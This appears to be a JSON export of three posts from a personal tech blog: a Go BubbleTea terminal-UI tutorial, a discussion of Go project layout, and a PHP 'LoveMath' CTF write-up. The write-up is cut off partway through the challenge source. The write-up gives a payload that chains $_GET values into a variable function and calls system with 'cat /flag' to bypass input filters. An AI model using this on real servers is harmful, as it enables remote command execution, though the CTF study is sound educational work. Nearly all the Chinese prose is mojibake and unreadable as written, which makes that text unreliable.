[{"content":"ç®€ä»‹ The fun, functional and stateful way to build terminal apps. A Go framework based on The Elm Architecture. Bubble Tea is well-suited for simple and complex terminal applications, either inline, full-window, or a mix of both.\nBubbleTeaæ˜¯ä¸€ä¸ªè½»é‡çº§çš„TUI(Terminal User Interface)æ¡†æ¶ï¼Œåœ¨å…¶åŸºç¡€ä¸Šï¼Œå¯ä»¥è½»æ¾çš„å¼€å‘ä¸€äº›å¥½çœ‹çš„å‘½ä»¤è¡Œå·¥å…·ã€‚\nBubbleç¬¦åˆElmæ¡†æ¶(ä¸€ç§å‡½æ•°å¼çš„å‰ç«¯æ¡†æ¶)çš„æ ‡å‡†ã€‚\nåŸºç¡€ é¦–å…ˆç†Ÿæ‚‰ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ä¸­çš„ä¾‹å­ã€‚æˆ‘ä»¬åœ¨è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªç®€å•çš„é€‰é¡¹è¡¨ï¼Œæ¨¡æ‹Ÿè®©ç”¨æˆ·é€‰æ‹©ä¸åŒé£Ÿç‰©ã€‚\nç¨‹åºå…¥å£ func main() { // æ­¤å¤„çš„initialModel()è¿”å›ä¸€ä¸ªModel model := initialModel() p := tea.NewProgram(initialModel()) if _, err := p.Run(); err != nil { fmt.Printf(\u0026#34;Alas, there\u0026#39;s been an error: %v\u0026#34;, err) os.Exit(1) } } ç”¨tea.NewProgram()åˆ›å»ºä¸€ä¸ªprogramï¼Œç„¶åä½¿ç”¨p.Run()æ¥å¯åŠ¨ç¨‹åºã€‚tea.NewProgram()çš„å‚æ•°é€šå¸¸æ˜¯Modelç±»å‹ã€‚\nModel Modelæ˜¯ä¸€ä¸ªæ¥å£ï¼Œæ¥å£å®šä¹‰å¦‚ä¸‹\n// Model contains the program\u0026#39;s state as well as its core functions. type Model interface { Init() Cmd Update(Msg) (Model, Cmd) View() string } ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦æˆ‘ä»¬çš„ç±»å‹å®ç°äº†Init(), Update(Msg), View()æ–¹æ³•ï¼Œå°±å¯ä»¥æŠŠå…¶ä½œä¸ºModelå‚æ•°ä¼ å…¥tea.NewProgram()ä¸­ã€‚\nåˆ›å»ºä¸€ä¸ªmodelç»“æ„ä½“ï¼Œå¹¶å®ç°Modelæ¥å£ã€‚\ntype model struct { choices []string cursor int selected map[int]struct{} } // é¦–å…ˆè¢«è°ƒç”¨çš„å‡½æ•°ï¼Œè¿”å›optional // å¦‚æœä¸æ‰§è¡Œåˆå§‹å‘½ä»¤ï¼Œåˆ™è¿”å› nilã€‚ func (m model) Init() tea.Cmd { return nil } // æ”¶åˆ°æ¶ˆæ¯æ—¶è°ƒç”¨Update()ã€‚ç”¨å®ƒæ¥æ£€æŸ¥æ¶ˆæ¯ // Update()å°†æ›´æ–°Modelæˆ–è€…æ‰§è¡ŒæŒ‡ä»¤ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) { switch msg := msg.(type) { case tea.KeyMsg: switch msg.String() { case \u0026#34;ctrl+c\u0026#34;, \u0026#34;q\u0026#34;: return m, tea.Quit case \u0026#34;up\u0026#34;, \u0026#34;k\u0026#34;: if m.cursor \u0026gt; 0 { m.cursor-- } case \u0026#34;down\u0026#34;, \u0026#34;j\u0026#34;: if m.cursor \u0026lt; len(m.choices)-1 { m.cursor++ } case \u0026#34;enter\u0026#34;, \u0026#34; \u0026#34;: _, ok := m.selected[m.cursor] if ok { delete(m.selected, m.cursor) } else { m.selected[m.cursor] = struct{}{} } } } return m, nil } // View()ç”¨æ¥æ¸²æŸ“UIï¼Œæ¯æ¬¡è°ƒç”¨Update()åéƒ½ä¼šè°ƒç”¨View() func (m model) View() string { s := \u0026#34;What should we buy at the market?\\n\\n\u0026#34; for i, choice := range m.choices { cursor := \u0026#34; \u0026#34; if m.cursor == i { cursor = \u0026#34;\u0026gt;\u0026#34; } checked := \u0026#34; \u0026#34; if _, ok := m.selected[i]; ok { checked = \u0026#34;x\u0026#34; } s += fmt.Sprintf(\u0026#34;%s [%s] %s\\n\u0026#34;, cursor, checked, choice) } s += \u0026#34;\\nPress q to quit.\\n\u0026#34; return s } Update()æ¥å—çš„msgå¯ä»¥æ˜¯ä»»ä½•ç±»å‹çš„ï¼Œé€šå¸¸ä½¿ç”¨æ–­è¨€è¿›è¡Œç±»å‹åˆ¤æ–­ï¼Œä»è€Œå¯¹ä¸åŒç±»å‹çš„msgåšå¤„ç†ã€‚åœ¨ä¾‹å­ä¸­ï¼Œtea.KeyMsgæŒ‡çš„æ˜¯æ˜¯é”®ç›˜è¾“å…¥ï¼Œé‡Œé¢å¯¹åº”ä¸åŒçš„ç±»å‹åšäº†ä¸åŒé€»è¾‘åˆ¤æ–­ã€‚\nView()æ˜¯æ¸²æŸ“UIçš„å‡½æ•°ï¼Œè¿™é‡Œé€šè¿‡å¯¹mã€‚curosrä¸ºçš„å€¼è¿›è¡Œåˆ¤æ–­ï¼Œä»è€Œæ˜¾ç¤ºæ¸¸æ ‡\u0026gt;çš„ä½ç½®ã€‚\nInitializationå‡½æ•° å®ä¾‹ä»£ç ä¸­è¿˜æä¾›äº†ä¸€ä¸ªInitializationå‡½æ•°ï¼Œç”¨æ¥åˆå§‹åŒ–modelä¸­çš„æ•°æ®ï¼Œä½†æ˜¯è¿™ä¹Ÿä¸æ˜¯å¿…é¡»çš„ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å¾ˆå¤šåˆ«çš„æ–¹æ³•åˆ›å»ºã€ç¼–è¾‘modelä¸­çš„å€¼\nfunc initialModel() model { return model{ // Our to-do list is a grocery list choices: []string{\u0026#34;Buy carrots\u0026#34;, \u0026#34;Buy celery\u0026#34;, \u0026#34;Buy kohlrabi\u0026#34;}, // A map which indicates which choices are selected. We\u0026#39;re using // the map like a mathematical set. The keys refer to the indexes // of the `choices` slice, above. selected: make(map[int]struct{}), } } å½“ç„¶ï¼Œå®ä¾‹ä¸­çš„TUIè¿‡äºç®€é™‹ï¼Œå®é™…ä¸ŠBubbleTeaå¼€å‘çš„TUIéƒ½å¾ˆæ¼‚äº®ã€‚BubbleTeaçš„GitHubé¡µé¢æä¾›äº†éå¸¸å¤šçš„å®ä¾‹ï¼Œä¾›å¼€å‘è€…å­¦ä¹ ã€‚\nè¿›åº¦æ¡(å®˜æ–¹ç”¨ä¾‹) ä¸€ä¸ªæ¸å˜è‰²çš„è¿›åº¦æ¡(animated)ï¼ŒåŠ¨ç”»è¿‡æ¸¡å¹³æ»‘\nå¦ä¸€ç§å®ç°æ–¹å¼(é™æ€çš„)ï¼Œæ¯æ¬¡updateæ‰æ¸²æŸ“ä¸€æ¬¡ã€‚\nå®ç°(animated) å…¨å±€å˜é‡\nconst ( padding = 2 // å¡«å……é•¿åº¦ maxWidth = 80 // è¿›åº¦æ¡å®½åº¦ ) var helpStyle = lipgloss.NewStyle().Foreground(lipgloss.Color(\u0026#34;#626262\u0026#34;)).Render // å¸®åŠ©å­—æ®µæ ·å¼ type tickMsg time.Time // msgç±»å‹ modelå®šä¹‰\n// å¼•å…¥äº†\u0026#34;github.com/charmbracelet/bubbles/progress\u0026#34;ä¸­çš„progressè¿™ä¸ªmodel type model struct { progress progress.Model } github.com/charmbracelet/bubbles/ æœ¬èº«ä¹Ÿæœ‰ä¸å°‘å·²ç»å®ç°çš„modelï¼Œæ¯”å¦‚list, progress, spinner, paginator, spinner, tableç­‰ï¼Œå¯ä»¥å¿«é€Ÿæ„å»ºä¸€ä¸ªTUIåº”ç”¨ã€‚\nInitå‡½æ•°å®ç°\nfunc (m model) Init() tea.Cmd { return tickCmd() } è¿™é‡Œè¿”å›äº†tickCmd()å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å®šä¹‰å¦‚ä¸‹:\nfunc tickCmd() tea.Cmd { return tea.Tick(time.Second*1, func(t time.Time) tea.Msg { return tickMsg(t) }) } åé¢çš„å‡½æ•°ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œç›®çš„åªæ˜¯è¿”å›ä¸€ä¸ªtime.timeç±»å‹ï¼Œè¿™é‡Œæˆ‘å…¶å®ä¸ç†è§£ä¸ºä»€ä¹ˆå¼€å‘è€…ä¼šæŠŠè¿™ä¸ªå‡½æ•°è®¾è®¡çš„è¿™ä¹ˆå¤æ‚ï¼Œåœ¨tea.Tickçš„å®ç°ä¸­ï¼Œæœ‰å¤§æ®µçš„è¯è§£é‡Šï¼Œå¤§è‡´å†…å®¹å¦‚ä¸‹ï¼š\nTickäº§ç”Ÿçš„å®šæ—¶å™¨ç‹¬ç«‹äºç³»ç»Ÿæ—¶é—´ Tickå‡½æ•°éœ€è¦ä¼ å…¥ä¸€ä¸ªæ—¶é—´é—´éš”å’Œä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ã€‚è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªæ¶ˆæ¯ï¼Œåœ¨è¿™ä¸ªæ¶ˆæ¯ä¸­åŒ…å«äº†å®šæ—¶å™¨è§¦å‘çš„æ—¶é—´ Tickå‡½æ•°åªä¼šå‘é€å•ä¸ªæ¶ˆæ¯ï¼Œå¹¶ä¸ä¼šè‡ªåŠ¨æŒ‰ç…§é—´éš”å‘é€å¤šä¸ªæ¶ˆæ¯ã€‚ä¸ºäº†å®ç°å®šæœŸè§¦å‘æ¶ˆæ¯ï¼Œéœ€è¦åœ¨æ¥æ”¶åˆ°æ¶ˆæ¯åè¿”å›å¦ä¸€ä¸ª Tick Cmdã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™æ ·çš„å†™æ³•å¯ä»¥å½“æˆå›ºå®šçš„ç»„åˆç”¨æ³•\ntype TickMsg time.Time func doTick() Cmd { return Tick(time.Second, func(t time.Time) Msg { return TickMsg(t) }) } func (m model) Init() Cmd { // Start ticking. return doTick() } func (m model) Update(msg Msg) (Model, Cmd) { switch msg.(type) { case TickMsg: // Return your Tick command again to loop. return m, doTick() } return m, nil } Updateå‡½æ•°\nfunc (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) { switch msg := msg.(type) { case tea.KeyMsg: return m, tea.Quit case tea.WindowSizeMsg: m.progress.Width = msg.Width - padding*2 - 4 if m.progress.Width \u0026gt; maxWidth { m.progress.Width = maxWidth } return m, nil case tickMsg: if m.progress.Percent() == 1.0 { return m, tea.Quit } // Note that you can also use progress.Model.SetPercent to set the // percentage value explicitly, too. cmd := m.progress.IncrPercent(0.25) return m, tea.Batch(tickCmd(), cmd) // FrameMsg is sent when the progress bar wants to animate itself case progress.FrameMsg: progressModel, cmd := m.progress.Update(msg) m.progress = progressModel.(progress.Model) return m, cmd default: return m, nil } } åœ¨Updateå‡½æ•°ä¸­ï¼Œåˆ†åˆ«å¤„ç†äº†çª—å£å¤§å°äº‹ä»¶ï¼Œç‚¹æŒ‰é”®ç›˜äº‹ä»¶ï¼Œæ—¶é—´è·³åŠ¨äº‹ä»¶ç­‰ã€‚\nViewæ–¹æ³•\nfunc (m model) View() string { pad := strings.Repeat(\u0026#34; \u0026#34;, padding) return \u0026#34;\\n\u0026#34; + pad + m.progress.View() + \u0026#34;\\n\\n\u0026#34; + pad + helpStyle(\u0026#34;Press any key to quit\u0026#34;) } åœ¨processçš„æ–¹æ³•çš„åŸºç¡€ä¸Šï¼Œæ·»åŠ äº†å ä½ç¬¦ï¼Œæ·»åŠ äº†å¸®åŠ©ä¿¡æ¯ã€‚\nå‘½ä»¤è¡Œè¿·å®« package tui import ( \u0026#34;strings\u0026#34; \u0026#34;vimMaze/maze\u0026#34; tea \u0026#34;github.com/charmbracelet/bubbletea\u0026#34; \u0026#34;github.com/charmbracelet/lipgloss\u0026#34; ) const ( wall = iota path person end key ) // è®¾ç½®å¸®åŠ©å­—æ®µæ ·å¼ï¼Œç –å—æ ·å¼ var helpStyle = lipgloss.NewStyle().Foreground(lipgloss.Color(\u0026#34;#626262\u0026#34;)).Render var brickStyle = lipgloss.NewStyle().Foreground(lipgloss.Color(\u0026#34;#B6482F\u0026#34;)).Render type model struct { Maze maze.Maze } func (m model) Init() tea.Cmd { return nil } func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) { switch msg := msg.(type) { case tea.KeyMsg: switch key := msg.String(); key { case \u0026#34;ctrl+c\u0026#34;: return m, tea.Quit case \u0026#34;j\u0026#34;: m.Maze.GoDown() return m, nil case \u0026#34;k\u0026#34;: m.Maze.GoUp() return m, nil case \u0026#34;h\u0026#34;: m.Maze.Goleft() return m, nil case \u0026#34;l\u0026#34;: m.Maze.Goright() return m, nil } case tea.WindowSizeMsg: m.Maze = maze.GenerateMaze(min(msg.Height, msg.Width)) return m, nil } var cmd tea.Cmd return m, cmd } func (m model) View() string { if m.Maze.Win == true { return \u0026#34;You win!ğŸ‰\u0026#34; + \u0026#34;\\n\\n \u0026#34; + helpStyle(\u0026#34;Press ctrl+c to exit\u0026#34;) } var build strings.Builder for _, valueRow := range m.Maze.Map { for _, valuePoint := range valueRow { if valuePoint == wall { build.WriteString(brickStyle(\u0026#34;â–‘â–‘\u0026#34;)) } else if valuePoint == path { build.WriteString(\u0026#34; \u0026#34;) } else if valuePoint == person { build.WriteString(\u0026#34;ğŸ§‘\u0026#34;) } else if valuePoint == end { build.WriteString(\u0026#34;ğŸ’°\u0026#34;) } } build.WriteString(\u0026#34;\\n\u0026#34;) } return build.String() } TODO: ä¸ºnmapå¼€å‘ä¸€ä¸ªç®€å•TUIï¼Œæ–¹ä¾¿ç”¨æˆ·å®šä¹‰å‚æ•° å¯èƒ½é¥é¥æ— æœŸäº†\n","permalink":"https://fr000g.github.io/post/tech/%E7%94%A8bubbletea%E5%86%99%E4%B8%80%E4%B8%AA%E6%BC%82%E4%BA%AE%E7%9A%84tui%E7%A8%8B%E5%BA%8F/","summary":"ç®€ä»‹ The fun, functional and stateful way to build terminal apps. A Go framework based on The Elm Architecture. Bubble Tea is well-suited for simple and complex terminal applications, either inline, full-window, or a mix of both. BubbleTeaæ˜¯ä¸€ä¸ªè½»é‡çº§çš„TUI(Terminal User Int","title":"ç”¨BubbleTeaå†™ä¸€ä¸ªæ¼‚äº®çš„TUIç¨‹åº"},{"content":"Goé¡¹ç›®å¸ƒå±€ å®˜æ–¹é¡¹ç›®ç»„ç»‡æ¨è å®˜æ–¹é¡¹ç›®åœ°å€\nåœ¨å®˜æ–¹æ–‡æ¡£ä¸­ï¼Œæ²¡æœ‰æ˜ç¡®æŒ‡å‡ºä»€ä¹ˆç±»å‹çš„ç»„ä»¶åº”è¯¥è¢«æ”¾ç½®ä»€ä¹ˆä½ç½®ï¼Œåªæ˜¯åšäº†ä¸€äº›æ¯”è¾ƒåŸºæœ¬çš„æ¨è\nBasic package å¯¹äºç®€å•çš„åŒ…ï¼Œä½¿ç”¨å•ä¸ªæ–‡ä»¶å°è£…å³å¯\nproject-root-directory/ â”œâ”€â”€ go.mod â”œâ”€â”€ modname.go â””â”€â”€ modname_test.go Basic command å¯¹äºç®€å•çš„å¯æ‰§è¡Œç¨‹åºï¼Œå¦‚æœç¨‹åºä¸å¤ªå¤æ‚ï¼Œä¹Ÿå¯ä»¥ç”¨å•ä¸ªçš„goæ–‡ä»¶æ¥ç»„ç»‡\nproject-root-directory/ â”œâ”€â”€ go.mod â”œâ”€â”€ auth.go â”œâ”€â”€ auth_test.go â”œâ”€â”€ client.go â””â”€â”€ main.go Package or command with supporting packages ç¨å¾®å¤æ‚ä¸€äº›çš„åŒ…æˆ–å¯æ‰§è¡Œç¨‹åºï¼Œå¯ä»¥æ ¹æ®åŠŸèƒ½æ‹†å°æˆä¸åŒç›®å½•ä¸­ã€‚è€Œä¸”å®˜æ–¹ä¹Ÿæ¨èåˆ›å»ºä¸€ä¸ªinternalç›®å½•ï¼Œé˜²æ­¢ä¸€äº›å¼€å‘è€…ä¸å¸Œæœ›æš´éœ²çš„å†…éƒ¨æ–¹æ³•æš´éœ²ã€‚\nproject-root-directory/ â”œâ”€â”€ internal/ â”‚ â”œâ”€â”€ auth/ â”‚ â”‚ â”œâ”€â”€ auth.go â”‚ â”‚ â””â”€â”€ auth_test.go â”‚ â””â”€â”€ hash/ â”‚ â”œâ”€â”€ hash.go â”‚ â””â”€â”€ hash_test.go â”œâ”€â”€ go.mod â”œâ”€â”€ modname.go â””â”€â”€ modname_test.go Multiple packages å¦‚æœä¸€ä¸ªæ¨¡å—ç”±å¤šä¸ªå¯å¯¼å…¥çš„åŒ…ç»„æˆï¼Œåˆ™æ¯ä¸ªåŒ…æœ‰è‡ªå·±çš„ç›®å½•\nproject-root-directory/ â”œâ”€â”€ go.mod â”œâ”€â”€ modname.go â”œâ”€â”€ modname_test.go â”œâ”€â”€ auth/ â”‚ â”œâ”€â”€ auth.go â”‚ â”œâ”€â”€ auth_test.go â”‚ â””â”€â”€ token/ â”‚ â”œâ”€â”€ token.go â”‚ â””â”€â”€ token_test.go â”œâ”€â”€ hash/ â”‚ â””â”€â”€ hash.go â””â”€â”€ internal/ â””â”€â”€ trace/ â””â”€â”€ trace.go æœ‰ä¸€ä¸ªä¾‹å­ï¼Œå°±æ˜¯netè¿™ä¸ªåŒ…çš„ç»„ç»‡æ–¹å¼ï¼Œæ‰€ä»¥å¯¼å…¥çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹å¼å¯¼å…¥\nimport ( \u0026#34;net/http\u0026#34; \u0026#34;net/rpc\u0026#34; ) ç±»ä¼¼çš„ï¼Œå®˜æ–¹è¿˜æåˆ°äº†Multiple commands Packages and commands in the same repository Server projectç­‰å¤šç§å¸ƒå±€ï¼Œæ¨èé˜…è¯»æŸ¥çœ‹ã€‚\nçŸ¥åéå®˜æ–¹é¡¹ç›®è§„èŒƒ æœ€è¿‘ä¹Ÿçœ‹åˆ°äº†ä¸€ä¸ªéå®˜æ–¹çš„é¡¹ç›®å¸ƒå±€çš„golang-standards/project-layoutçš„repoï¼Œç”¨äºå¤§å‹çš„å¤æ‚é¡¹ç›®çš„æ–‡ä»¶ç»„ç»‡å’Œå¸ƒå±€ï¼Œè¿™é‡Œé¢è¯¦ç»†è¯´æ˜äº†å„ç§ç»„ä»¶åº”è¯¥ç”¨ä»€ä¹ˆæ ·çš„æ–¹å¼å»ç»„ç»‡ã€‚\nè¿™äº›å»ºè®®ï¼Œå¦‚æœæŒ‰ç…§åŠŸèƒ½åˆ†ç±»ï¼Œå¯ä»¥æŒ‰ç…§ä¸€ä¸‹æ¥åˆ†ï¼š\nåº”ç”¨ç¨‹åºç›®å½• /cmd: åŒ…å«é¡¹ç›®çš„ä¸»è¦åº”ç”¨ç¨‹åºã€‚ /internal: åŒ…å«ç§æœ‰åº”ç”¨ç¨‹åºå’Œåº“ä»£ç ï¼Œä¸å¸Œæœ›å¤–éƒ¨å¯¼å…¥ã€‚ /pkg: åŒ…å«å¯¹å¤–å…¬å¼€çš„åº“ä»£ç ã€‚ æœåŠ¡åº”ç”¨ç¨‹åºç›®å½• /api: åŒ…å« OpenAPI/Swagger è§„èŒƒã€JSON æ¨¡å¼æ–‡ä»¶ç­‰ã€‚ Web åº”ç”¨ç¨‹åºç›®å½• /web: åŒ…å« Web åº”ç”¨ç¨‹åºç‰¹å®šç»„ä»¶ï¼Œå¦‚é™æ€ Web èµ„äº§ã€æœåŠ¡å™¨ç«¯æ¨¡æ¿å’Œå•é¡µåº”ç”¨ç¨‹åºã€‚ å…¬å…±åº”ç”¨ç¨‹åºç›®å½• /configs: é…ç½®æ–‡ä»¶æ¨¡æ¿æˆ–é»˜è®¤é…ç½®ã€‚ /init: ç³»ç»Ÿåˆå§‹åŒ–å’Œè¿›ç¨‹ç®¡ç†å™¨é…ç½®ã€‚ /scripts: æ‰§è¡Œæ„å»ºã€å®‰è£…ã€åˆ†æç­‰æ“ä½œçš„è„šæœ¬ã€‚ /build: æ‰“åŒ…å’ŒæŒç»­é›†æˆé…ç½®ã€‚ /deployments: IaaSã€PaaSã€ç³»ç»Ÿå’Œå®¹å™¨ç¼–æ’éƒ¨ç½²é…ç½®å’Œæ¨¡æ¿ã€‚ æµ‹è¯•ç›®å½• /test: åŒ…å«é¢å¤–çš„å¤–éƒ¨æµ‹è¯•åº”ç”¨ç¨‹åºå’Œæµ‹è¯•æ•°æ®ã€‚ å…¶ä»–ç›®å½• /docs: è®¾è®¡å’Œç”¨æˆ·æ–‡æ¡£ã€‚ /tools: é¡¹ç›®çš„æ”¯æŒå·¥å…·ã€‚ /examples: åº”ç”¨ç¨‹åºå’Œ/æˆ–å…¬å…±åº“çš„ç¤ºä¾‹ã€‚ /third_party: å¤–éƒ¨è¾…åŠ©å·¥å…·ã€åˆ†å‰ä»£ç å’Œå…¶ä»–ç¬¬ä¸‰æ–¹å®ç”¨ç¨‹åºã€‚ /githooks: Git é’©å­ã€‚ /assets: ä¸å­˜å‚¨åº“ç›¸å…³çš„å…¶ä»–èµ„äº§ï¼ˆå›¾ç‰‡ã€æ ‡å¿—ç­‰ï¼‰ã€‚ /website: é¡¹ç›®ç½‘ç«™æ•°æ®ï¼ˆå¦‚æœæ²¡æœ‰ä½¿ç”¨ GitHub é¡µé¢ï¼‰ã€‚ è¿™ä¸ªrepoè¿˜ç€é‡å¼ºè°ƒäº†ï¼Œåƒä¸‡ä¸è¦ç”¨/srcè¿™ç§ç±»å‹çš„ç›®å½•ï¼Œè¿™æ ·å¯èƒ½ä¼šå¯¼è‡´å’Œgoæœ¬èº«çš„srcç›®å½•æ··æ·†ã€‚\nå­˜åœ¨çš„é—®é¢˜ ä½†æ˜¯è¿™ä¸ªé¡¹ç›®è¢«goçš„å®˜æ–¹äººå‘˜ç”¨ä¸å¤ªå®¢æ°”çš„è¯­æ°”é”è¯„äº†äº†\nThere are two problems with this GitHub repo:\nit claims to host Go standards and does not, in the sense that these are in no way official standards the project-layout standard it puts forth is far too complex and not a standard Regarding \u0026ldquo;why not tell us the standard Go project layout and we\u0026rsquo;ll update the doc?\u0026rdquo;, that only addresses point 2. If there really were standards, they would be in the main Go project doc tree. The standard for project layout would also be a lot shorter. I appreciate your trying to provide a useful resource, but calling it \u0026lsquo;golang-standards\u0026rsquo; is claiming more than it is.\nBut for the record, the minimal standard layout for an importable Go repo is really:\nPut a LICENSE file in your root Put a go.mod file in your root Put Go code in your repo, in the root or organized into a directory tree as you see fit That\u0026rsquo;s it. That\u0026rsquo;s the \u0026ldquo;standard\u0026rdquo;.\nIn particular:\nIt is not required to put commands in cmd/. It is not required to put packages in pkg/. It is not required to put web stuff in web/. It is not required to put APIs in api/. It is not required to put web stuff in web/. It is not required to put configurations in configs/. It is not required to put systemd scripts in init/. It is not required to put shell scripts in scripts/. It is not required to put Docker files in build/package/. It is not required to put CI configs in build/ci/. It is not required to put deployment configs in deployments/. It is not required to put test support in test/. It is not required to put documentation in docs/. It is not required to put supporting tools in tools/. It is not required to put examples in examples/. It is not required to put third_party code in third_party/. It is not required to put git hooks in githooks/ It is not required to put static assets in assets/. It is not required to put website data in website/.\nThe importable golang.org/x repos break every one of these \u0026ldquo;rules\u0026rdquo;.\nè¿™æ®µè¯ç”±Russ Coxåœ¨ä¸€ä¸ªissueä¸­æå‡ºï¼Œå¤§è‡´è¯´äº†ä¸¤ä¸ªäº‹æƒ…\nä¸€ä¸ªé¡¹ç›®åªè¦LICENSEï¼Œgo.modï¼Œè¿˜æœ‰goçš„æºç å°±è¶³å¤Ÿäº†ï¼Œå¯ä»¥ç”¨ç›®å½•ç»„ç»‡goçš„æºä»£ç  è¿™ä¸ªrepoå¤ªé¸¡å„¿å¤æ‚äº†ï¼Œä¸æ˜¯å®˜æ–¹æ¨èï¼Œä¹Ÿä¸æ˜¯ä»€ä¹ˆæ ‡å‡† çœ‹æ¥goçš„å¼€å‘è€…ä¸å¤ªå¸Œæœ›å¤§å®¶å—åˆ°æ¡æ¡æ¡†æ¡†çš„é™åˆ¶ï¼Œå¸Œæœ›å¼€å‘è€…ä»¬ä»¥ä¸€ç§çµæ´»èµ„æºçš„æ–¹å¼å»å¼€å‘ã€‚\n","permalink":"https://fr000g.github.io/post/tech/go%E9%A1%B9%E7%9B%AE%E5%B8%83%E5%B1%80/","summary":"Goé¡¹ç›®å¸ƒå±€ å®˜æ–¹é¡¹ç›®ç»„ç»‡æ¨è å®˜æ–¹é¡¹ç›®åœ°å€ åœ¨å®˜æ–¹æ–‡æ¡£ä¸­ï¼Œæ²¡æœ‰æ˜ç¡®æŒ‡å‡ºä»€ä¹ˆç±»å‹çš„ç»„ä»¶åº”è¯¥è¢«æ”¾ç½®ä»€ä¹ˆä½ç½®ï¼Œåªæ˜¯åšäº†ä¸€äº›æ¯”è¾ƒåŸºæœ¬çš„æ¨è Basic package å¯¹äºç®€å•çš„","title":"Goé¡¹ç›®å¸ƒå±€"},{"content":"LoveMath-writeup å‰ç½®çŸ¥è¯† å¯å˜å‡½æ•° PHP æ”¯æŒå¯å˜å‡½æ•°çš„æ¦‚å¿µã€‚è¿™æ„å‘³ç€å¦‚æœä¸€ä¸ªå˜é‡ååæœ‰åœ†æ‹¬å·ï¼ŒPHP å°†å¯»æ‰¾ä¸å˜é‡çš„å€¼åŒåçš„å‡½æ•°ï¼Œå¹¶ä¸”å°è¯•æ‰§è¡Œå®ƒã€‚å¯å˜å‡½æ•°å¯ä»¥ç”¨æ¥å®ç°åŒ…æ‹¬å›è°ƒå‡½æ•°ï¼Œå‡½æ•°è¡¨åœ¨å†…çš„ä¸€äº›ç”¨é€”ã€‚\nå¯å˜å‡½æ•°ä¸èƒ½ç”¨äºä¾‹å¦‚ echoï¼Œprintï¼Œunset()ï¼Œisset()ï¼Œempty()ï¼Œincludeï¼Œrequire ä»¥åŠç±»ä¼¼çš„è¯­è¨€ç»“æ„ã€‚éœ€è¦ä½¿ç”¨è‡ªå·±çš„åŒ…è£…å‡½æ•°æ¥å°†è¿™äº›ç»“æ„ç”¨ä½œå¯å˜å‡½æ•°ã€‚\nä¾‹å­ \u0026lt;?php function foo() { echo \u0026#34;In foo()\u0026lt;br /\u0026gt;\\n\u0026#34;; } function bar($arg = \u0026#39;\u0026#39;) { echo \u0026#34;In bar(); argument was \u0026#39;$arg\u0026#39;.\u0026lt;br /\u0026gt;\\n\u0026#34;; } // ä½¿ç”¨ echo çš„åŒ…è£…å‡½æ•° function echoit($string) { echo $string; } $func = \u0026#39;foo\u0026#39;; $func(); // This calls foo() $func = \u0026#39;bar\u0026#39;; $func(\u0026#39;test\u0026#39;); // This calls bar() $func = \u0026#39;echoit\u0026#39;; $func(\u0026#39;test\u0026#39;); // This calls echoit() ?\u0026gt; è¿™æ„å‘³ç€åœ¨ç‰¹å®šæƒ…å†µä¸‹ï¼Œä¸€æ¬¡ä¼ å‚çš„è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥é€šè¿‡?a=($_GET[b])($_GET[c])æ¥æ‰§è¡Œç³»ç»Ÿå‡½æ•°ï¼Œä¾‹å¦‚ï¼š?a=($_GET['b'])($_GET['c']);b=system\u0026amp;c=cat /flag\nâ€‹æ­¤æ—¶ï¼Œåªä¼šå¯¹å‚æ•°aè¿›è¡Œæ£€æŸ¥\nå½“[]è¢«è¿‡æ»¤æ—¶ï¼Œå¯ç”¨{}ä»£æ›¿\nbase_convert()å‡½æ•°ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—\nè¯­æ³•\nbase_convert(number,frombase,tobase) å…¶ä¸­ï¼Œnumberä¸ºåŸå§‹å€¼ï¼Œfrombaseä¸ºåŸè¿›åˆ¶ï¼Œtobaseä¸ºç›®æ ‡è¿›åˆ¶ï¼Œæ”¯æŒ2-36è¿›åˆ¶\ndecbin(),dechex(),decoct()ç­‰å‡½æ•°ï¼Œå‡ä¸ºè¿›åˆ¶è½¬æ¢å‡½æ•°\näº†è§£ä¸€äº›phpå†…ç½®çš„ä¸€äº›mathå‡½æ•°ï¼Œä¾‹å¦‚ä¸Šè¿°å‡½æ•°\nhex2bin()å‡½æ•°ï¼Œå°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¯ç”¨äºåšå‡ºå­—ç¬¦\né¢˜è§£ é¢˜ç›®æºç  \u0026lt;?php error_reporting(0); //å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag if(!isset($_GET[\u0026#39;c\u0026#39;])){ show_source(__FILE__); }else{ //ä¾‹å­ c=20-1 $content = $_GET[\u0026#39;c\u0026#39;]; if (strlen($content) \u0026gt;= 80) { die(\u0026#34;å¤ªé•¿äº†ä¸ä¼šç®—\u0026#34;); } $blacklist = [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\\[\u0026#39;, \u0026#39;\\]\u0026#39;]; foreach ($blacklist as $blackitem) { if (preg_match(\u0026#39;/\u0026#39; . $blackitem . \u0026#39;/m\u0026#39;, $content)) { die(\u0026#34;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦\u0026#34;); } } //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [\u0026#39;abs\u0026#39;, \u0026#39;acos\u0026#39;, \u0026#39;acosh\u0026#39;, \u0026#39;asin\u0026#39;, \u0026#39;asinh\u0026#39;, 